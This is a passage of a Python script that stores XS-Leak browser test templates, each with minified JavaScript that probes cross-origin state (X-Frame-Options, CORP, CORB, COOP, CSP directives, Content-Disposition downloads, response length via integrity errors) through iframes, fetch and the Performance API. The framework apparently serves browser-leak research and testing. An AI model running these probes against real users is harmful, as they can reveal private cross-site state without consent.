    "test_function": "async e=>fetch(e, {\r\n        credentials: \"include\",\r\n        mode: \"no-cors\",\r\n        integrity: \"sha256-aaaaa\"\r\n    }).catch((e=>{\r\n        console.debug(e.message);\r\n        let t = e.message.match(/Content length: (\\d*), Expected content/);\r\n        return t && t[1] ? \"221396\" === t[1] ? 0 : \"917323\" === t[1] ? 1 : t[1] : 0\r\n    }\r\n    ))",
    "test_timeout": 4000
  },
  {
    "test_name": "ContentDocument X-Frame Leak",
    "test_category": "HTTP Header",
    "test_description": "Detect X-Frame-Options with ContentDocument.",
    "test_file": "/src/leaks/leak_contentdocument.js",
    "test_function": "async e=>new Promise((async(t,n)=>{\r\n        let s = document.createElement(\"object\");\r\n        return s.data = e,\r\n        document.body.appendChild(s),\r\n        await $(750),\r\n        console.debug(s.contentDocument),\r\n        null !== s.contentDocument ? (s.remove(),\r\n        t(1)) : (s.remove(),\r\n        t(0))\r\n    }\r\n    ))"
  },
  {
    "test_name": "Performance API X-Frame Leak",
    "test_category": "HTTP Header",
    "test_description": "Detect X-Frame-Options with Performance API.",
    "test_file": "/src/leaks/leak_performance_xframe.js",
    "test_function": "async e=>{\r\n        let t = document.createElement(\"iframe\");\r\n        return t.src = e,\r\n        new Promise((n=>{\r\n            t.onload = t.onerror = ()=>{\r\n                t.remove();\r\n                let s = performance.getEntriesByType(\"resource\").filter((t=>t.name === e)).length;\r\n                return console.debug(`len = ${s}`),\r\n                n(0 !== s ? 0 : 1)\r\n            }\r\n            ,\r\n            document.body.appendChild(t)\r\n        }\r\n        ))\r\n    }"
  },
  {
    "test_name": "Performance API CORP Leak",
    "test_category": "HTTP Header",
    "test_description": "Detect Cross-Origin-Resource-Policy header with Performance API.",
    "test_file": "/src/leaks/leak_performance_corp.js",
    "test_function": "async e=>{\r\n        let t = document.createElement(\"img\");\r\n        return t.src = e,\r\n        new Promise((n=>{\r\n            t.onload = t.onerror = ()=>{\r\n                t.remove();\r\n                let s = performance.getEntriesByType(\"resource\").filter((t=>t.name === e)).pop();\r\n                return console.debug(`${s}`),\r\n                s ? \"\" === s.nextHopProtocol ? n(1) : n(0) : n(1)\r\n            }\r\n            ,\r\n            document.body.appendChild(t)\r\n        }\r\n        ))\r\n    }"
  },
  {
    "test_name": "CORP Leak",
    "test_category": "HTTP Header",
    "test_description": "Detect Cross-Origin-Resource-Policy header with fetch.",
    "test_file": "/src/leaks/leak_fetch_corp.js",
    "test_function": "async e=>fetch(e, {\r\n        credentials: \"include\",\r\n        mode: \"no-cors\"\r\n    }).then((()=>0)).catch((()=>1))"
  },
  {
    "test_name": "CORB Leak",
    "test_category": "HTTP Header",
    "test_description": "Detect X-Content-Type-Options in combination with specific content type using CORB.",
    "test_file": "/src/leaks/leak_corb.js",
    "test_function": "async e=>new Promise((t=>{\r\n        let n = document.createElement(\"script\");\r\n        n.src = e,\r\n        window.addEventListener(\"error\", (e=>(n.remove(),\r\n        console.debug(`window.onerror: ${e.message}`),\r\n        t(0))), {\r\n            once: !0\r\n        }),\r\n        n.onload = n.onerror = async()=>(await N(100),\r\n        n.remove(),\r\n        t(1)),\r\n        document.head.appendChild(n)\r\n    }\r\n    ))"
  },
  {
    "test_name": "Download Detection",
    "test_category": "HTTP Header",
    "test_description": "Detect downloads (Content-Disposition header).",
    "test_file": "/src/leaks/leak_download.js",
    "test_function": "async e=>new Promise((t=>{\r\n        let n = document.createElement(\"iframe\");\r\n        window.onmessage = e=>(n.remove(),\r\n        t(e.data)),\r\n        n.srcdoc = `\\n            <iframe id=\"frame\" src=\"${e}\"></iframe>\\n            <script>\\n                window.onload = () => {\\n                    try{\\n                        // is it about:blank?\\n                        frame.contentWindow.location.href\\n                        parent.postMessage(1,'*');\\n                    }catch(e){\\n                        parent.postMessage(0,'*');\\n                    }\\n                }\\n            <\\/script>`,\r\n        document.body.appendChild(n)\r\n    }\r\n    ))",
    "test_timeout": 6000
  },
  {
    "test_name": "Performance API Download Detection",
    "test_category": "HTTP Header",
    "test_description": "Detect downloads (Content-Disposition header) with Performance API.",
    "test_file": "/src/leaks/leak_performance_download.js",
    "test_function": "async e=>{\r\n        let t = document.createElement(\"iframe\");\r\n        return t.src = e,\r\n        new Promise((async n=>{\r\n            document.body.appendChild(t),\r\n            await D(1e3),\r\n            t.remove();\r\n            let s = performance.getEntriesByType(\"resource\").filter((t=>t.name === e)).length;\r\n            return console.debug(`len = ${s}`),\r\n            n(0 !== s ? 0 : 1)\r\n        }\r\n        ))\r\n    }",
    "test_timeout": 4000
  },
  {
    "test_name": "CSP Directive Leak",
    "test_category": "HTTP Header",
    "test_description": "Detect CSP directives with CSP iframe attribute.",
    "test_file": "/src/leaks/leak_csp_directive.js",
    "test_function": "async(e,t=\"default-src 'self';\")=>new Promise((n=>{\r\n        let s = document.createElement(\"iframe\");\r\n        s.setAttribute(\"csp\", t),\r\n        s.src = e;\r\n        let a = history.length;\r\n        if (a > 48)\r\n            throw new Error(\"History to long\");\r\n        s.onload = ()=>{\r\n            s.onload = ()=>{\r\n                let e = history.length;\r\n                return s.remove(),\r\n                n(e - a)\r\n            }\r\n            ,\r\n            s.src = e\r\n        }\r\n        ,\r\n        document.body.append(s)\r\n    }\r\n    ))",
    "test_timeout": 3000
  },
  {
    "test_name": "COOP Leak",
    "test_category": "HTTP Header",
    "test_description": "Detect Cross-Origin-Opener-Policy header with popup.",
    "test_file": "/src/leaks/leak_coop.js",
    "test_function": "async e=>new Promise((async t=>{\r\n        window.WW.location = e,\r\n        await M(1e3);\r\n        try {\r\n            return console.debug(window.WW.document),\r\n            await M(1e3),\r\n            t(1)\r\n        } catch (e) {\r\n            return console.debug(e),\r\n            await R(window.WW),\r\n            t(0)\r\n        }\r\n    }\r\n    ))",
    "test_timeout": 4000,
    "test_needsWindow": "true"
  }
]

for test in testtemp:
    print(test)
    test_timeout=10e4
    test_needswindow="false"
    if test.get("test_timeout"):
        test_timeout=test.get("test_timeout")
    if test.get("test_needsWindow"):
        test_needswindow=test.get("test_needsWindow")
    testtemplate(test_name=test.get("test_name"),test_category=test.get("test_category"),test_description=test.get("test_description"),test_file=test.get("test_file"),test_timeout=test_timeout,test_needswindow=test_needswindow).save()